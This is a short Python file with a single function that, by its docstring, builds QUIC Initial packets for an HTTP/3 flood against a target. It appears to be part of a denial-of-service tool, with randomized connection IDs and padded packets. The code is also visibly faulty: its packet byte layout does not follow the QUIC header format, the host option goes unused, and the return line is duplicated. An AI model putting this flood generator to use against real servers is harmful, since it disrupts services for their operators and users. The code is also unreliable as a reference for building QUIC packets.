import os

def generate_payload(target, options=None):
    """
    QUIC Initial packet for HTTP/3 flood.
    options:
      - host: str, SNI/Host (default: target)
      - randomize: bool, randomize connection ID
    """
    host = options.get('host', target) if options else target
    randomize = options.get('randomize', True) if options else True
    conn_id = os.urandom(8) if randomize else b'\x00'*8
    payload = (
        b'\xc3' + conn_id + b'\x00\x00\x00\x01' + b'\x00' * 1200  # Initial + padding
    )
    return payload
    return payload
